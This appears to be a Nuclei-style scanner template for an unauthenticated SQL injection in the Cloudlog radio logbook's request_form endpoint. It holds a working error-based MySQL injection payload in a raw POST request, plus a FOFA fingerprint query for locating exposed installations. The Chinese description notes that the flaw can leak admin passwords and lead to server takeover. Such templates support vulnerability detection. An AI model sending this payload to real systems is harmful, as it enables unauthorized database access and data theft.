http:
    - matchers:
        - part: body
          type: word
          words:
            - qbqkq1qbqkq1
        - status:
            - 500
          type: status
      matchers-condition: and
      raw:
        - |
          POST /index.php/oqrs/request_form HTTP/1.1
          Host: {{Hostname}}
          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36
          Content-Type: application/x-www-form-urlencoded
          Connection: close

          station_id=1 AND (SELECT 2469 FROM(SELECT COUNT(*),CONCAT(0x7162716b71,(SELECT (ELT(2469=2469,1))),0x7162716b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
id: Cloudlog-request_form-sql
info:
    author: Superhero
    description: |-
        fofa: icon_hash="-460032467"
        Cloudlog 电台日志系统 request_form 接口存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
    name: Cloudlog 电台日志系统 request_form SQL注入漏洞
    reference:
        - https://mp.weixin.qq.com/s/IdVDXeUFRO5A2SyNsbztxA?token=1383368913&lang=zh_CN
    severity: high
    tags: []
